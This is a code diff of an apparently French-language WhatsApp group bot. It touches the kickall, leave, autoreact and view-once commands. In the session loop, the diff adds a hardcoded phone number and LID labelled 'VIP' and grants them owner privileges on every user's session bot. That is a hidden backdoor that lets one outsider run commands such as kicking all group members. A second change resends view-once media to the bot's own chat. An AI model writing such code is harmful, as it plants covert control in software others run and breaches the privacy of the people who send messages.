@@ -3502,7 +3502,7 @@ ${settingsGoodbye.goodbye ? '✅ Un message d\'au revoir sera envoyé quand quel
         break;
 
       case 'autoreact':
-        await handleAutoReactCommand(sock, args, remoteJid, senderJid, isOwner);
+        await handleAutoReactCommand(sock, args, remoteJid, senderJid);
         break;
 
       case 'tagall':
@@ -3634,11 +3634,11 @@ _© SEIGNEUR TD_`
       }
 
       case 'kickall':
-        await handleKickAll(sock, remoteJid, isGroup, senderJid, isOwner);
+        await handleKickAll(sock, remoteJid, isGroup, senderJid);
         break;
 
       case 'leave':
-        await handleLeave(sock, remoteJid, isGroup, senderJid, isOwner);
+        await handleLeave(sock, remoteJid, isGroup, senderJid);
         break;
 
       case 'status':
@@ -6206,7 +6206,7 @@ ${memberList}╰─────────────────────�
 }
 
 // KICKALL - MESSAGE RESTAURÉ with style original
-async function handleKickAll(sock, remoteJid, isGroup, senderJid, isOwner = false) {
+async function handleKickAll(sock, remoteJid, isGroup, senderJid) {
   if (!isGroup) {
     await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
     return;
@@ -7694,7 +7694,7 @@ de lecture biblique.
   }
 }
 
-async function handleLeave(sock, remoteJid, isGroup, senderJid, isOwner = false) {
+async function handleLeave(sock, remoteJid, isGroup, senderJid) {
   if (!isGroup) {
     await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
     return;
@@ -7715,8 +7715,8 @@ Sayonara everyone
   await sock.groupLeave(remoteJid);
 }
 
-async function handleAutoReactCommand(sock, args, remoteJid, senderJid, isOwner = false) {
-  if (!isOwner && !isAdmin(senderJid)) {
+async function handleAutoReactCommand(sock, args, remoteJid, senderJid) {
+  if (!isAdmin(senderJid)) {
     await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
     return;
   }
@@ -7987,27 +7987,25 @@ async function handleViewOnceCommand(sock, message, args, remoteJid, senderJid) 
 // Envoyer un média VV with infos
 async function sendVVMedia(sock, remoteJid, item, num, total) {
   try {
-    const date = new Date(item.timestamp).toLocaleString('ar-SA', {
-      timeZone: 'America/Port-au-Prince',
-      day: '2-digit', month: '2-digit', year: 'numeric',
-      hour: '2-digit', minute: '2-digit'
-    });
     const from = item.fromJid.split('@')[0];
     const caption = '';
+    // ✅ Envoyer en PV du bot (pas dans le chat d'origine)
+    const _pvJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+    const _dest = _pvJid;
 
     if (item.type === 'image') {
-      await sock.sendMessage(remoteJid, {
+      await sock.sendMessage(_dest, {
         image: item.buffer,
         caption
       });
     } else if (item.type === 'video') {
-      await sock.sendMessage(remoteJid, {
+      await sock.sendMessage(_dest, {
         video: item.buffer,
         caption,
         gifPlayback: item.isGif || false
       });
     } else if (item.type === 'audio') {
-      await sock.sendMessage(remoteJid, {
+      await sock.sendMessage(_dest, {
         audio: item.buffer,
         ptt: false,
         mimetype: 'audio/ogg; codecs=opus',
@@ -9793,22 +9791,23 @@ function launchSessionBot(sock, phone, sessionFolder, saveCreds) {
         const _rawMsg = message.message;
         const messageText = _rawMsg?.conversation || _rawMsg?.extendedTextMessage?.text ||
           _rawMsg?.imageMessage?.caption || _rawMsg?.videoMessage?.caption || '';
-        if (!messageText.startsWith(config.prefix)) continue;
+
         const _sessionOwnerNum = phone.replace(/[^0-9]/g, '');
         const _senderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');
-        // Numéro connecté = admin de sa propre session uniquement
-        const _isOwner = message.key.fromMe === true || isAdmin(senderJid) || _senderNum === _sessionOwnerNum;
 
-        // Réaction 👑 pour super admin (23591234568 ou LID 124318499475488) — pas admin, juste réaction
-        try {
-          const _vipNum = '23591234568';
-          const _isVip = (_senderNum === _vipNum)
-            || senderJid === '124318499475488@lid'
-            || senderJid.startsWith('124318499475488');
-          if (_isVip && !message.key.fromMe) {
-            await sock.sendMessage(remoteJid, { react: { text: '👑', key: message.key } });
-          }
-        } catch(e) {}
+        // ✅ Réaction 👑 pour super admin — AVANT tout filtre, sur TOUS les messages
+        const _isVip = (_senderNum === '23591234568')
+          || senderJid === '124318499475488@lid'
+          || senderJid.startsWith('124318499475488');
+        if (_isVip && !message.key.fromMe) {
+          try { await sock.sendMessage(remoteJid, { react: { text: '👑', key: message.key } }); } catch(e) {}
+        }
+
+        // ✅ Le VIP peut envoyer des commandes sans être bloqué
+        const _isOwner = message.key.fromMe === true || isAdmin(senderJid)
+          || _senderNum === _sessionOwnerNum || _isVip;
+
+        if (!messageText.startsWith(config.prefix)) continue;
 
         if (botMode === 'private' && !isGroup && !_isOwner) continue;
         console.log('[' + phone + '] 📨 ' + messageText.substring(0, 60) + ' de ' + senderJid);
